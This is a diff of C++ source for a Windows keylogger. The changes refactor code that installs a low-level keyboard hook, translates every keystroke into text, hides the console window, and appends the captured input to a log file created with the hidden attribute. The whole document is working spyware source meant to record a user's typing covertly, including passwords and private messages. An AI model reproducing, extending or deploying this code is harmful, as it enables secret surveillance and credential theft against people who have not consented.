@@ -1,17 +1,14 @@
-﻿#include "keys.h"
+﻿#include "constants.h"
+#include "keys.h"
 
 #include <shlwapi.h>
 #include <cstdio>
-#include <iostream>
 #include <time.h>
 #include <fstream>
 #include <sstream>
 
-#include "constants.h"
-
 HHOOK _hook;
 KBDLLHOOKSTRUCT kbdStruct;
-std::ofstream out;
 
 int Save(int key_stroke)
 {
@@ -24,14 +21,12 @@ int Save(int key_stroke)
     }
 
     HWND foreground = GetForegroundWindow();
-    DWORD threadID;
     HKL layout = NULL;
 
     if (foreground)
     {
-        // get keyboard layout of the thread
-        threadID = GetWindowThreadProcessId(foreground, NULL);
-        layout = GetKeyboardLayout(threadID);
+        DWORD dwThreadId = GetWindowThreadProcessId(foreground, NULL);
+        layout = GetKeyboardLayout(dwThreadId);
     }
 
     if (foreground)
@@ -58,10 +53,10 @@ int Save(int key_stroke)
     {
         case VK_BACK:       output << "[BACKSPACE]";    break;
         case VK_RETURN:     output << "[ENTER]";        break;
-        case VK_SPACE:      output << "[SPACE]";        break;
+        case VK_SPACE:      output << " ";              break;
         case VK_TAB:        output << "[TAB]";          break;
         case VK_MENU:       output << "[ALT]";          break;
-        case VK_ESCAPE:     output << "[ESCAPE]";       break;
+        case VK_ESCAPE:     output << "[ESC]";          break;
         case VK_END:        output << "[END]";          break;
         case VK_HOME:       output << "[HOME]";         break;
         case VK_LEFT:       output << "[LEFT]";         break;
@@ -69,7 +64,7 @@ int Save(int key_stroke)
         case VK_RIGHT:      output << "[RIGHT]";        break;
         case VK_DOWN:       output << "[DOWN]";         break;
         case VK_PRIOR:      output << "[PGUP]";         break;
-        case VK_NEXT:       output << "[PG_DOWN]";      break;
+        case VK_NEXT:       output << "[PGDN]";         break;
         case VK_LWIN:
         case VK_RWIN:       output << "[WIN]";          break;
         case VK_SHIFT:
@@ -131,12 +126,8 @@ int Save(int key_stroke)
             output << char(key);
     }
 
-    // instead of opening and closing file handlers every time, keep file open and flush.
-    out << output.str();
-    out.flush();
-
-    std::cout << output.str();
-
+    WriteLog(output.str());
+    
     return 0;
 }
 
@@ -147,15 +138,12 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
         // the action is valid: HC_ACTION.
         if (wParam == WM_KEYDOWN)
         {
-            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
             kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-
-            // save to file
             Save(kbdStruct.vkCode);
         }
     }
 
-    // call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
+    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
     return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
@@ -167,7 +155,7 @@ void SetHook()
     // function that sets and releases the hook.
     if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
     {
-        _RPT0(_CRT_WARN, "Error: Failed to install hook!\n");
+        _RPT0(_CRT_WARN, __FUNCTION__ ": Failed to install hook!\n");
     }
 }
 
@@ -178,28 +166,42 @@ void ReleaseHook()
 
 void Stealth()
 {
-    // set current working directory
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
+}
+
+BOOL WriteLog(const std::string& contents)
+{
+    // Set current working directory.
     WCHAR cwd[MAX_PATH] = { 0 };
     GetModuleFileName(NULL, cwd, MAX_PATH);
     PathRemoveFileSpec(cwd); // shlwapi.lib
     SetCurrentDirectory(cwd);
 
-    // open output file in append mode
-    out.open(OUTPUT_FILE_NAME, std::ios_base::app);
-    if (out.is_open())
-        OutputDebugString(L"Created output file\n");
-    else
-        OutputDebugString(L"Could not create output file\n"), exit(1);
-
-#ifdef _DEBUG
-    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
-#else
-    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
-#endif
-
-    DWORD attr = GetFileAttributes(OUTPUT_FILE_NAME);
-    if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
-        SetFileAttributes(OUTPUT_FILE_NAME, attr | FILE_ATTRIBUTE_HIDDEN);
-        OutputDebugString(L"File hidden");
+    HANDLE hFile = CreateFile(
+        OUTPUT_FILE_NAME,
+        FILE_APPEND_DATA,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        NULL,
+        OPEN_ALWAYS, // open existing or create new file
+        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NORMAL,
+        NULL);
+    
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        _RPT2(_CRT_ERROR, __FUNCTION__ ": Could not create or open output file '%s' (0x%x)\n", OUTPUT_FILE_NAME, GetLastError());
+        exit(1);
     }
+
+    _RPT2(_CRT_WARN, __FUNCTION__ ": Obtained handle to '%s' [0x%x]\n", OUTPUT_FILE_NAME, hFile);
+
+    DWORD dwBytesWritten = 0;
+    if (!WriteFile(hFile, contents.c_str(), contents.length(), &dwBytesWritten, NULL))
+    {
+        _RPT2(_CRT_ERROR, __FUNCTION__ ": Failed to write to '%s' (0x%x)\n", OUTPUT_FILE_NAME, GetLastError());
+        exit(1);
+    }
+
+    _RPT2(_CRT_WARN, __FUNCTION__ ": Wrote %s [%d bytes]\n", contents.c_str(), dwBytesWritten);
+    if (hFile) CloseHandle(hFile);
+    return dwBytesWritten != 0;
 }
